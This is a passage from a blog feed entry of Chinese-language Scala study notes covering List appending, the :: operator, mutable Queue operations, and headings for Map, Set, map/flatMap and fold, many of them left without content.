class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> value1 = list1(<span class="number">1</span>)</span><br><span class="line">println(value1)</span><br></pre></td></tr></table></figure><h5 id="List元素的追加"><a href="#List元素的追加" class="headerlink" title="List元素的追加"></a>List元素的追加</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> list2 = list1 :+ <span class="number">99</span></span><br><span class="line">println(list2)</span><br><span class="line"><span class="keyword">val</span> list3 = <span class="number">100</span> +: list1</span><br><span class="line">println(list3)</span><br></pre></td></tr></table></figure><p>List的创建与追加，符号“::”，注意观察去掉Nil和不去掉Nil的区别</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> list4 = <span class="number">1</span> :: <span class="number">2</span> :: <span class="number">3</span> :: list1 :: <span class="type">Nil</span></span><br><span class="line">println(list4)</span><br></pre></td></tr></table></figure><h4 id="队列Queue"><a href="#队列Queue" class="headerlink" title="队列Queue"></a>队列Queue</h4><p>队列数据存取符合先进先出的策略</p><h5 id="队列的创建"><a href="#队列的创建" class="headerlink" title="队列的创建"></a>队列的创建</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scala.collection.mutable</span><br><span class="line"><span class="keyword">val</span> q1 = <span class="keyword">new</span> mutable.<span class="type">Queue</span>[<span class="type">Int</span>]</span><br><span class="line">println(q1)</span><br></pre></td></tr></table></figure><h5 id="队列元素的追加"><a href="#队列元素的追加" class="headerlink" title="队列元素的追加"></a>队列元素的追加</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">q1+=<span class="number">1</span></span><br><span class="line">print;n(q1)</span><br></pre></td></tr></table></figure><h5 id="队列的追加"><a href="#队列的追加" class="headerlink" title="队列的追加"></a>队列的追加</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">q1 ++= <span class="type">List</span>(<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line">println(q1)</span><br></pre></td></tr></table></figure><h5 id="按照进入队列的顺序删除元素"><a href="#按照进入队列的顺序删除元素" class="headerlink" title="按照进入队列的顺序删除元素"></a>按照进入队列的顺序删除元素</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">q1.dequeue()</span><br><span class="line">println(q1)</span><br></pre></td></tr></table></figure><h5 id="塞入数据"><a href="#塞入数据" class="headerlink" title="塞入数据"></a>塞入数据</h5><h5 id="返回队列的第一个元素"><a href="#返回队列的第一个元素" class="headerlink" title="返回队列的第一个元素"></a>返回队列的第一个元素</h5><h5 id="返回队列的最后一个元素"><a href="#返回队列的最后一个元素" class="headerlink" title="返回队列的最后一个元素"></a>返回队列的最后一个元素</h5><h5 id="返回队列最后一个元素"><a href="#返回队列最后一个元素" class="headerlink" title="返回队列最后一个元素"></a>返回队列最后一个元素</h5><h5 id="返回除了第一个以外的元素"><a href="#返回除了第一个以外的元素" class="headerlink" title="返回除了第一个以外的元素"></a>返回除了第一个以外的元素</h5><h5 id="返回除了第一个以外的元素-1"><a href="#返回除了第一个以外的元素-1" class="headerlink" title="返回除了第一个以外的元素"></a>返回除了第一个以外的元素</h5><h4 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h4><h5 id="构造不可变映射"><a href="#构造不可变映射" class="headerlink" title="构造不可变映射"></a>构造不可变映射</h5><h5 id="构造可变映射"><a href="#构造可变映射" class="headerlink" title="构造可变映射"></a>构造可变映射</h5><h5 id="空的映射"><a href="#空的映射" class="headerlink" title="空的映射"></a>空的映射</h5><h5 id="对偶元组"><a href="#对偶元组" class="headerlink" title="对偶元组"></a>对偶元组</h5><h5 id="取值"><a href="#取值" class="headerlink" title="取值"></a>取值</h5><h5 id="更新值"><a href="#更新值" class="headerlink" title="更新值"></a>更新值</h5><h5 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h5><h4 id="集-Set"><a href="#集-Set" class="headerlink" title="集 Set"></a>集 Set</h4><h5 id="1-Set不可变集合的创建"><a href="#1-Set不可变集合的创建" class="headerlink" title="1.Set不可变集合的创建"></a>1.Set不可变集合的创建</h5><h5 id="2-Set可变集合的创建，如果import了可变集合，那么后续继续使用默认也是可变集合"><a href="#2-Set可变集合的创建，如果import了可变集合，那么后续继续使用默认也是可变集合" class="headerlink" title="2.Set可变集合的创建，如果import了可变集合，那么后续继续使用默认也是可变集合"></a>2.Set可变集合的创建，如果import了可变集合，那么后续继续使用默认也是可变集合</h5><h5 id="3-可变集合的元素添加"><a href="#3-可变集合的元素添加" class="headerlink" title="3.可变集合的元素添加"></a>3.可变集合的元素添加</h5><h5 id="4-可变集合的元素删除"><a href="#4-可变集合的元素删除" class="headerlink" title="4.可变集合的元素删除"></a>4.可变集合的元素删除</h5><h5 id="5-遍历"><a href="#5-遍历" class="headerlink" title="5.遍历"></a>5.遍历</h5><h5 id="6-Set更多常用操作"><a href="#6-Set更多常用操作" class="headerlink" title="6.Set更多常用操作"></a>6.Set更多常用操作</h5><h4 id="集合元素与函数的映射"><a href="#集合元素与函数的映射" class="headerlink" title="集合元素与函数的映射"></a>集合元素与函数的映射</h4><h5 id="map"><a href="#map" class="headerlink" title="map"></a>map</h5><h5 id="flatmap"><a href="#flatmap" class="headerlink" title="flatmap"></a>flatmap</h5><h4 id="化简、折叠、扫描"><a href="#化简、折叠、扫描" class="headerlink" title="化简、折叠、扫描"></a>化简、折叠、扫描</h4><h5 id="折叠，化简：将二次元函数引用于集合中的函数。"><a href="#折叠，化简：将二次元函数引用于集合中的函数。" class="headerlink" title="折叠，化简：将二次元函数引用于集合中的函数。"></a>折叠，化简：将二次元函数引用于集合中的函数。</h5><h5 id="折叠，化简：fold"><a href="#折叠，化简：fold" class="headerlink" title="折叠，化简：fold"></a>折叠，化简：fold</h5>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;开一个新坑，Scala这门语言在优化上有很大的操作余地，需要相当的熟练度。本文仅做基础笔记的整理。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Language" scheme="http://yoursite.com/categories/Language/"/>
    
      <category term="Scala" scheme="http://yoursite.com/categories/Language/Scala/"/>
    
    
      <category term="Scala" scheme="http://yoursite.com/tags/Scala/"/>
    
  </entry>
  
</feed>
